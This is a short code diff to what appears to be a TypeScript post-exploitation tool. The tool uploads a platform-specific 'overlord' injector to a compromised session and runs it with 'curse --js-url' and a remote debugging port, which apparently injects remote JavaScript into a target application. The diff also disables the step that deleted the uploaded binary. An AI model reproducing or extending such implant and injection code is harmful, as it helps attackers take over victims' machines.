@@ -100,7 +100,10 @@ function getInjectorPath(session: Session): string {
           return MACOS_OVERLORD_AMD64
       }
       break
-      
+
+    default:
+      console.error(`[!] Unsupported platform ${session.getOs()}/${session.getArch()}`)
+      process.exit(9)
   }
   return ''
 }
@@ -212,10 +215,11 @@ if (fs.existsSync(args.config)) {
     }
  
     console.log(`[*] Executing payload injector ...`)
-    const injection = await interact.execute(upload.getPath(), ['cursed', '--js-url', args.js_url], true)
+    const injectorArgs = ['curse', '--js-url', args.js_url, '--remote-debugging-port', `${DEBUG_PORT}`]
+    const injection = await interact.execute(upload.getPath(), injectorArgs, true)
 
     console.log('[*] Cleaning up ...')
-    await interact.rm(upload.getPath())
+    // await interact.rm(upload.getPath())
 
     if (injection.getStatus() !== 0) {
       console.log(`[!] Injector exit status ${injection.getStatus()}`)
